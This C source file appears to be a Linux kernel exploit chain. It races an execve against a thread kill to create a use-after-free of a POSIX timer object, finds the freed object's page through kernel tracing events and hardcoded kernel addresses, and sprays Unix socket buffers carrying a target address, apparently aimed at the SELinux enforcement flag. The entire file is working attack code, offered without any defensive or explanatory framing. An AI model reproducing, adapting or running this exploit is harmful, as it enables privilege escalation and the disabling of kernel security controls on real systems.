/*
 * final - the full chain in one run:
 *   phase 1  child ready (vmas + lockers + killer + exec thread)
 *   phase 2  parent enables kmem_cache_alloc tracing, releases the timer arming
 *   phase 3  timers armed, exec tid known
 *   parent collects the #ARMED k_itimer address (the victim), then phase 4
 *   child proceeds to execve, killer fires on the tid swap
 *   parent sprays, matches the victim page PFN against mm_page_alloc
 *   owns it -> reap -> read /sys/fs/selinux/enforce
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sched.h>

#define T "/sys/kernel/tracing"
#define NVMA 50000
#define N_TIMERS 1024
#define ARMED 512
#define MAX_SOCKS 6000
#define KVA 0xffff000000000000ULL
#define TIMER_SITE 0xffffffd6401a726cULL     /* do_timer_create+0x350, this boot */
#define SELINUX_MINUS7 0xffffffd642759629ULL

struct ipc_s {
    _Atomic int phase;
    _Atomic int helpers[8];
    _Atomic int nhelpers;
    _Atomic int go, stop, in_mprotect, exec_tid;
};
static struct ipc_s *ipc;
static void *g_vmas; static size_t g_vmalen; static int g_vmafd;
static int g_socks[MAX_SOCKS][2]; static int g_nsocks;
static unsigned char g_pat[8192];
static char g_trace[48 << 20];
static char *g_raw; static size_t g_rawcap = 48u << 20, g_rawused;
static pthread_mutex_t g_mu = PTHREAD_MUTEX_INITIALIZER;
static int g_fds[16], g_nfds;

static void noop(int s) { (void)s; }
static int pin_cpu(int c) { cpu_set_t s; CPU_ZERO(&s); CPU_SET(c, &s); return sched_setaffinity(0, sizeof(s), &s); }
static int wf(const char *p, const char *v) { int fd = open(p, O_WRONLY); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }
static int wfa(const char *p, const char *v) { int fd = open(p, O_WRONLY | O_APPEND); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }

static int prepare_vmas(void)
{
    long page = sysconf(_SC_PAGESIZE); int i;
    g_vmafd = (int)syscall(SYS_memfd_create, "v", 1);
    if (g_vmafd < 0 || ftruncate(g_vmafd, page)) return -1;
    g_vmalen = (size_t)NVMA * (size_t)page;
    g_vmas = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_vmas == MAP_FAILED) return -1;
    for (i = 0; i < NVMA; i++) {
        void *at = (char *)g_vmas + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, g_vmafd, 0) != at) return -1;
    }
    return 0;
}
static int locker_fn(void *arg)
{
    (void)arg;
    while (!atomic_load(&ipc->go)) { if (atomic_load(&ipc->stop)) return 0; sched_yield(); }
    while (!atomic_load(&ipc->stop)) {
        pid_t p;
        atomic_store(&ipc->in_mprotect, 1);
        p = fork();
        if (p == 0) _exit(0);
        if (p > 0) { int st; waitpid(p, &st, 0); }
        atomic_store(&ipc->in_mprotect, 0);
    }
    return 0;
}
static int killer_fn(void *arg)
{
    int tgid = (int)(intptr_t)arg; int old;
    pin_cpu(2);
    while (!(old = atomic_load(&ipc->exec_tid))) { if (atomic_load(&ipc->stop)) return 0; sched_yield(); }
    for (;;) { if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break; if (atomic_load(&ipc->stop)) return 0; }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    return 0;
}
#define HELPER_STACK (1 << 20)
static int spawn_helper(int (*fn)(void *), void *arg)
{
    void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    int pid, idx;
    if (st == MAP_FAILED) return -1;
    pid = (int)clone(fn, (char *)st + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
    if (pid > 0) { idx = atomic_fetch_add(&ipc->nhelpers, 1); if (idx >= 0 && idx < 8) atomic_store(&ipc->helpers[idx], pid); }
    return pid;
}
static void *exec_fn(void *arg)
{
    static timer_t many[N_TIMERS];
    struct sigevent plain, ae; struct itimerspec sp;
    char *argv[] = { (char *)"final", (char *)"--exec-ok", NULL };
    int i;
    (void)arg;
    memset(&plain, 0, sizeof(plain)); plain.sigev_notify = SIGEV_NONE;
    memset(&ae, 0, sizeof(ae)); ae.sigev_notify = SIGEV_SIGNAL; ae.sigev_signo = SIGRTMIN;
    memset(&sp, 0, sizeof(sp)); sp.it_value.tv_sec = 3600;
    if (pin_cpu(0)) _exit(116);
    while (atomic_load(&ipc->phase) < 2) { if (atomic_load(&ipc->stop)) _exit(124); sched_yield(); }
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, i == ARMED ? &ae : &plain, &many[i])) _exit(120);
        if (i == ARMED && timer_settime(many[i], 0, &sp, NULL)) _exit(120);
    }
    atomic_store(&ipc->exec_tid, (int)syscall(SYS_gettid));
    atomic_store(&ipc->phase, 3);
    while (atomic_load(&ipc->phase) < 4) { if (atomic_load(&ipc->stop)) _exit(125); sched_yield(); }
    atomic_store(&ipc->go, 1);
    while (!atomic_load(&ipc->in_mprotect)) { if (atomic_load(&ipc->stop)) _exit(123); sched_yield(); }
    execve("/proc/self/exe", argv, NULL);
    _exit(122);
}
static void child_race(void)
{
    pthread_t th; sigset_t b; int tgid = (int)getpid(); int i;
    sigemptyset(&b); sigaddset(&b, SIGRTMIN); sigprocmask(SIG_BLOCK, &b, NULL);
    if (prepare_vmas()) _exit(110);
    if (pin_cpu(1)) _exit(115);
    for (i = 0; i < 3; i++) { int p = spawn_helper(locker_fn, NULL); if (p < 0) _exit(111); }
    if (spawn_helper(killer_fn, (void *)(intptr_t)tgid) < 0) _exit(112);
    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(114);
    atomic_store(&ipc->phase, 1);
    for (;;) pause();
}
static void *reader(void *arg)
{
    int fd = (int)(intptr_t)arg; char tmp[65536];
    for (;;) {
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n <= 0) break;
        pthread_mutex_lock(&g_mu);
        if (g_rawused + (size_t)n < g_rawcap) { memcpy(g_raw + g_rawused, tmp, (size_t)n); g_rawused += (size_t)n; }
        pthread_mutex_unlock(&g_mu);
    }
    return NULL;
}
static int open_raw(pthread_t *th)
{
    int i;
    g_rawused = 0;
    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        g_fds[g_nfds] = open(p, O_RDONLY);
        if (g_fds[g_nfds] < 0) break;
        pthread_create(&th[g_nfds], NULL, reader, (void *)(intptr_t)g_fds[g_nfds]);
        g_nfds++;
    }
    return g_nfds;
}
static void close_raw(pthread_t *th)
{
    int i;
    for (i = 0; i < g_nfds; i++) { close(g_fds[i]); pthread_join(th[i], NULL); }
    g_nfds = 0;
}
static uint64_t collect_victim(int *count)
{
    uint64_t chosen = 0; int n = 0; size_t off;
    for (off = 0; off + 32 <= g_rawused; off++) {
        uint64_t cs, ptr, sz;
        if (memcmp(g_raw + off, &(uint64_t){TIMER_SITE}, 8)) continue;
        memcpy(&cs, g_raw + off, 8);
        memcpy(&ptr, g_raw + off + 8, 8);
        memcpy(&sz, g_raw + off + 24, 8);
        if (cs != TIMER_SITE || sz != 0x180) continue;
        if (ptr < KVA || (ptr & 7)) continue;
        if (n == ARMED && !chosen) chosen = ptr;
        n++;
    }
    *count = n;
    return chosen;
}
static void *sprayer(void *arg)
{
    (void)arg;
    while (g_nsocks < MAX_SOCKS) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) break;
        if (send(sv[0], g_pat, sizeof(g_pat), MSG_DONTWAIT) != (ssize_t)sizeof(g_pat)) { close(sv[0]); close(sv[1]); break; }
        g_socks[g_nsocks][0] = sv[0]; g_socks[g_nsocks][1] = sv[1]; g_nsocks++;
    }
    return NULL;
}
static int wait_zombie(pid_t pid, int ms, int *status)
{
    int w = 0;
    for (;;) {
        siginfo_t info; memset(&info, 0, sizeof(info));
        if (waitid(P_PID, (id_t)pid, &info, WEXITED | WNOHANG | WNOWAIT) == 0 && info.si_pid == pid) { *status = info.si_status; return 0; }
        if (w >= ms) return 1; usleep(300); w++;
    }
}
static int read_full(const char *path, char *buf, size_t cap)
{
    int fd = open(path, O_RDONLY); size_t used = 0; ssize_t n;
    if (fd < 0) return -1;
    for (;;) { n = read(fd, buf + used, cap - used - 1); if (n <= 0) break; used += (size_t)n; if (used + 2 >= cap) break; }
    close(fd); buf[used] = 0; return (int)used;
}
static uint64_t pfn_of(uint64_t kva) { return (kva - 0xffffff8000000000ULL) >> 12; }

/* look for "kind: ... pfn=0x<base>" in the text trace */
static int trace_seen_pfn(const char *kind, uint64_t base)
{
    char *line;
    char needle[32];
    if (read_full(T "/trace", g_trace, sizeof(g_trace)) <= 0) return 0;
    snprintf(needle, sizeof(needle), "pfn=0x%llx", (unsigned long long)base);
    line = g_trace;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        if (strstr(line, kind) && strstr(line, needle)) return 1;
        line = nl ? nl + 1 : NULL;
    }
    return 0;
}

static int victim_page_allocated(uint64_t victim, int *frees, int *allocs)
{
    uint64_t pfn = (victim - 0xffffff8000000000ULL) >> 12;   /* PFN of the 4 KiB page */
    int nf = 0, na = 0, hit = 0;
    char *line;
    if (read_full(T "/trace", g_trace, sizeof(g_trace)) <= 0) return -1;
    line = g_trace;
    while (line && *line) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        if ((strstr(line, "mm_page_free:") || strstr(line, "mm_page_alloc:"))) {
            char *pp = strstr(line, "pfn=0x");
            if (pp) {
                unsigned long long p = strtoull(pp + 6, NULL, 16);
                if (strstr(line, "mm_page_free:")) { nf++; if (p == pfn || p == (pfn & ~1ULL)) hit = 1; }
                else { na++; if (p == pfn || p == (pfn & ~1ULL)) hit = 2; }
            }
        }
        line = nl ? nl + 1 : NULL;
    }
    if (frees) *frees = nf;
    if (allocs) *allocs = na;
    return hit;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 1;
    int i;
    uint64_t target = SELINUX_MINUS7;
    const char *e;

    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) return 0;
    setvbuf(stdout, NULL, _IOLBF, 0);
    e = getenv("TARGET"); if (e) target = strtoull(e, NULL, 0);

    ipc = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ipc == MAP_FAILED) return 1;
    g_raw = malloc(g_rawcap);
    {
        size_t off;
        memset(g_pat, 0, sizeof(g_pat));
        for (off = 8; off + 24 <= sizeof(g_pat); off += 24)
            *(uint64_t *)(g_pat + off + 16) = target;
    }
    printf("=== final: victim-targeted chain, target=%#llx ===\n", (unsigned long long)target);
    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc\n");
    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_free\n");
    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:mm_page_alloc\n");
    wf(T "/buffer_size_kb", "16384\n");

    for (i = 0; i < rounds; i++) {
        pid_t child; pthread_t th[16], sp; int st = 0, n = 0;
        uint64_t victim = 0;
        atomic_store(&ipc->phase, 0); atomic_store(&ipc->go, 0); atomic_store(&ipc->stop, 0);
        atomic_store(&ipc->in_mprotect, 0); atomic_store(&ipc->exec_tid, 0);
        atomic_store(&ipc->nhelpers, 0); g_nsocks = 0;
        child = fork();
        if (child == 0) child_race();
        if (child < 0) break;
        { int w = 0; while (atomic_load(&ipc->phase) < 1 && w < 5000) { usleep(1000); w++; }
          printf("    phase after ready wait: %d (waited %dms)\n", atomic_load(&ipc->phase), w); }
        /* Only now enable tracing: prepare_vmas() creates 50k VMAs and would
         * otherwise flood the ring buffer with kmem_cache_alloc records. */
        wf(T "/tracing_on", "0\n");
        { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
        wf(T "/tracing_on", "1\n");
        { size_t sz = 8u << 20; char *m = malloc(sz); if (m) { memset(m, 0x5a, sz); free(m); } }
        if (open_raw(th) <= 0) { printf("no raw pipes\n"); break; }
        atomic_store(&ipc->phase, 2);              /* let exec_fn arm the timers */
        { int w = 0; while (atomic_load(&ipc->phase) < 3 && w < 8000) { usleep(1000); w++; }
          printf("    phase after arm wait: %d (waited %dms)\n", atomic_load(&ipc->phase), w);
          if (atomic_load(&ipc->phase) < 3) {
              siginfo_t zi; memset(&zi, 0, sizeof(zi));
              if (waitid(P_PID, (id_t)child, &zi, WEXITED | WNOHANG | WNOWAIT) == 0 && zi.si_pid == child)
                  printf("    child already exited, si_status=%d\n", zi.si_status);
              else printf("    child alive but stuck before arming\n");
          } }
        usleep(400000);
        close_raw(th);                 /* stop the raw readers but KEEP tracing on:
                                        * the free/alloc of the victim page happen
                                        * after phase 4, when the kill lands. */
        victim = collect_victim(&n);
        printf("  round %d: allocations=%d victim=%#llx (page %#llx)\n",
               i, n, (unsigned long long)victim, (unsigned long long)(victim & ~0xfffULL));
        if (!victim) { printf("    no victim -> abort round\n"); kill(child, SIGKILL); waitpid(child, &st, 0); continue; }

        pthread_create(&sp, NULL, sprayer, NULL);   /* allocations already in flight */
        atomic_store(&ipc->phase, 4);              /* release: exec + kill now */
        if (wait_zombie(child, 8000, &st) != 0) {
            printf("    timeout waiting for the zombie\n");
            kill(child, SIGKILL); waitpid(child, &st, 0); continue;
        }
        {
            uint64_t base = pfn_of(victim + 0xe0) & ~1ULL;
            int freed = 0, hit = 0, tries;
            printf("    victim page pfn=%#llx  waiting for it to be freed...\n", (unsigned long long)base);
            for (tries = 0; tries < 40 && !freed; tries++) {
                usleep(200000);
                freed = trace_seen_pfn("mm_page_free:", base);
            }
            printf("    page_freed=%d (%.1fs)\n", freed, tries * 0.2);
            pthread_join(sp, NULL);
            hit = trace_seen_pfn("mm_page_alloc:", base);
            wf(T "/tracing_on", "0\n");
            wf(T "/buffer_size_kb", "16384\n");
            printf("    sockets=%d victim_page_owned=%d\n", g_nsocks, hit);
            {
                int s2; waitpid(child, &s2, 0);
                printf("    REAPED (status=%d)\n", st);
                { char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
                  if (fd >= 0) { if (read(fd, b, 1) > 0) printf("    enforce=%c\n", b[0]); close(fd); } }
            }
        }
        printf("    zombie status=%d sockets=%d\n", st, g_nsocks);
        {
            int nf = 0, na = 0;
            int hit = victim_page_allocated(victim, &nf, &na);
            printf("    page free=%d alloc=%d  own=%s\n", nf, na, hit > 0 ? "YES" : "no");
            if (hit > 0) {
                int s2; waitpid(child, &s2, 0);
                printf("    REAPED on the victim page\n");
                { char b[4] = {0}; int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
                  if (fd >= 0) { if (read(fd, b, 1) > 0) printf("    enforce=%c\n", b[0]); close(fd); } }
            } else {
                int s2; waitpid(child, &s2, 0);
                printf("    miss -> reaped anyway\n");
            }
        }
        { int h, nh = atomic_load(&ipc->nhelpers);
          for (h = 0; h < nh && h < 8; h++) { int hp = atomic_load(&ipc->helpers[h]); if (hp > 0) kill(hp, SIGKILL); } }
        for (int k = 0; k < g_nsocks; k++) { close(g_socks[k][0]); close(g_socks[k][1]); }
        g_nsocks = 0;
    }
    return 0;
}
